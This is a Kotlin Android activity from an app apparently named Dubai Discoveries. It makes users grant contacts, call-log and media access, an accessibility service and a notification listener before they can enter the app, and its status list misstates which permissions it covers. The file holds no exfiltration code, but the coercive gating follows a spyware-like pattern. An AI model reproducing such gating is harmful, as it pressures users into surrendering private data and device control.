package com.dubaidiscoveries.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.dubaidiscoveries.app.utils.DeviceUtils
import com.dubaidiscoveries.app.utils.PreferenceManager

class PermissionGatewayActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "PermissionGatewayActivity"
        private const val PERMISSION_REQUEST_CODE = 1001
    }
    
    private lateinit var preferenceManager: PreferenceManager
    private lateinit var deviceUtils: DeviceUtils
    
    // UI Elements
    private lateinit var systemPermissionsButton: Button
    private lateinit var accessibilityButton: Button
    private lateinit var notificationsButton: Button
    private lateinit var continueButton: Button
    private lateinit var statusText: TextView
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission_gateway)
        
        initializeViews()
        initializeServices()
        setupButtonListeners()
        updatePermissionStatus()
    }
    
    private fun initializeViews() {
        systemPermissionsButton = findViewById(R.id.systemPermissionsButton)
        accessibilityButton = findViewById(R.id.accessibilityButton)
        notificationsButton = findViewById(R.id.notificationsButton)
        continueButton = findViewById(R.id.continueButton)
        statusText = findViewById(R.id.statusText)
    }
    
    private fun initializeServices() {
        preferenceManager = PreferenceManager(this)
        deviceUtils = DeviceUtils(this)
    }
    
    private fun setupButtonListeners() {
        // Button 1 - System Grant Permissions
        systemPermissionsButton.setOnClickListener {
            Log.d(TAG, "System permissions button clicked")
            Log.d(TAG, "System button enabled: ${systemPermissionsButton.isEnabled}")
            Log.d(TAG, "System button clickable: ${systemPermissionsButton.isClickable}")
            requestSystemPermissions()
        }
        
        // Button 2 - Accessibility
        accessibilityButton.setOnClickListener {
            Log.d(TAG, "Accessibility button clicked")
            openAccessibilitySettings()
        }
        
        // Button 3 - Notifications
        notificationsButton.setOnClickListener {
            Log.d(TAG, "Notifications button clicked")
            openNotificationListenerSettings()
        }
        
        // Continue Button
        continueButton.setOnClickListener {
            Log.d(TAG, "Continue button clicked")
            proceedToVerification()
        }
    }
    
    private fun requestSystemPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS
        )
        
        Log.d(TAG, "Requesting system permissions: ${permissions.joinToString()}")
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
    }
    
    private fun openAccessibilitySettings() {
        Log.d(TAG, "Opening accessibility settings")
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }
    
    private fun openNotificationListenerSettings() {
        Log.d(TAG, "Opening notification listener settings")
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }
    
    private fun proceedToVerification() {
        if (areAllPermissionsGranted()) {
            Log.d(TAG, "All permissions granted, proceeding to verification")
            // Start the permission verification process
            startPermissionVerification()
        } else {
            Log.d(TAG, "Not all permissions granted, showing reminder")
            showPermissionsReminderDialog()
        }
    }
    
    private fun areAllPermissionsGranted(): Boolean {
        return deviceUtils.hasRequiredPermissions() && 
               checkAccessibilityService() && 
               checkNotificationListenerService()
    }
    
    private fun checkAccessibilityService(): Boolean {
        val accessibilityEnabled = Settings.Secure.getInt(
            contentResolver,
            Settings.Secure.ACCESSIBILITY_ENABLED, 0
        )
        
        if (accessibilityEnabled == 1) {
            val accessibilityServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            return accessibilityServices?.contains(packageName) == true
        }
        return false
    }
    
    private fun checkNotificationListenerService(): Boolean {
        val notificationListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        return notificationListeners?.contains(packageName) == true
    }
    
    private fun startPermissionVerification() {
        // This will be implemented to call the backend permission gateway
        // For now, we'll proceed to home if all permissions are granted
        Log.d(TAG, "Starting permission verification with backend")
        
        // Show verification dialog
        AlertDialog.Builder(this)
            .setTitle("🔐 Permission Verification")
            .setMessage("All local permissions granted! Now verifying with permission gateway...")
            .setPositiveButton("Continue") { _, _ ->
                // Here you would call your backend permission gateway
                // For now, we'll proceed to home
                proceedToHome()
            }
            .setCancelable(false)
            .show()
    }
    
    private fun proceedToHome() {
        Log.d(TAG, "Proceeding to home activity")
        preferenceManager.setPermissionsVerified(true)
        val intent = Intent(this, HomeActivity::class.java)
        startActivity(intent)
        finish()
    }
    
    private fun showPermissionsReminderDialog() {
        AlertDialog.Builder(this)
            .setTitle("⚠️ Permissions Required")
            .setMessage("Please grant all required permissions before continuing:\n\n" +
                       "• System Permissions (Contacts, Call Logs, Photos, Videos, Email)\n" +
                       "• Accessibility Service\n" +
                       "• Notification Listener Service")
            .setPositiveButton("Check Again") { _, _ ->
                updatePermissionStatus()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Stay on this screen
            }
            .show()
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            Log.d(TAG, "Permission request result received")
            updatePermissionStatus()
        }
    }
    
    override fun onResume() {
        super.onResume()
        Log.d(TAG, "Activity resumed, updating permission status")
        updatePermissionStatus()
    }
    
    private fun updatePermissionStatus() {
        val systemPermissionsGranted = deviceUtils.hasRequiredPermissions()
        val accessibilityGranted = checkAccessibilityService()
        val notificationsGranted = checkNotificationListenerService()
        
        Log.d(TAG, "Permission checks - System: $systemPermissionsGranted, Accessibility: $accessibilityGranted, Notifications: $notificationsGranted")
        
        // Update button states
        systemPermissionsButton.isEnabled = !systemPermissionsGranted
        accessibilityButton.isEnabled = !accessibilityGranted
        notificationsButton.isEnabled = !notificationsGranted
        
        Log.d(TAG, "Button states - System: ${systemPermissionsButton.isEnabled}, Accessibility: ${accessibilityButton.isEnabled}, Notifications: ${notificationsButton.isEnabled}")
        
        // Update button text to show status
        systemPermissionsButton.text = if (systemPermissionsGranted) "✅ System Permissions Granted" else "🔐 Grant System Permissions"
        accessibilityButton.text = if (accessibilityGranted) "✅ Accessibility Enabled" else "♿ Enable Accessibility"
        notificationsButton.text = if (notificationsGranted) "✅ Notifications Enabled" else "🔔 Enable Notifications"
        
        // Update status text
        val statusMessage = buildString {
            appendLine("📱 Permission Status:")
            appendLine("• Read Contacts: ${if (systemPermissionsGranted) "✅" else "❌"}")
            appendLine("• Read Call Logs: ${if (systemPermissionsGranted) "✅" else "❌"}")
            appendLine("• Read Photos & Videos: ${if (systemPermissionsGranted) "✅" else "❌"}")
            appendLine("• Read Email Accounts: ${if (systemPermissionsGranted) "✅" else "❌"}")
            appendLine("• Accessibility Service: ${if (accessibilityGranted) "✅" else "❌"}")
            appendLine("• Notification Listener: ${if (notificationsGranted) "✅" else "❌"}")
        }
        statusText.text = statusMessage
        
        // Enable/disable continue button
        continueButton.isEnabled = systemPermissionsGranted && accessibilityGranted && notificationsGranted
        
        // Update continue button text
        if (continueButton.isEnabled) {
            continueButton.text = "🚀 Continue to App"
        } else {
            continueButton.text = "⏳ Complete All Permissions"
        }
        
        Log.d(TAG, "Permission status updated - System: $systemPermissionsGranted, Accessibility: $accessibilityGranted, Notifications: $notificationsGranted")
    }
}
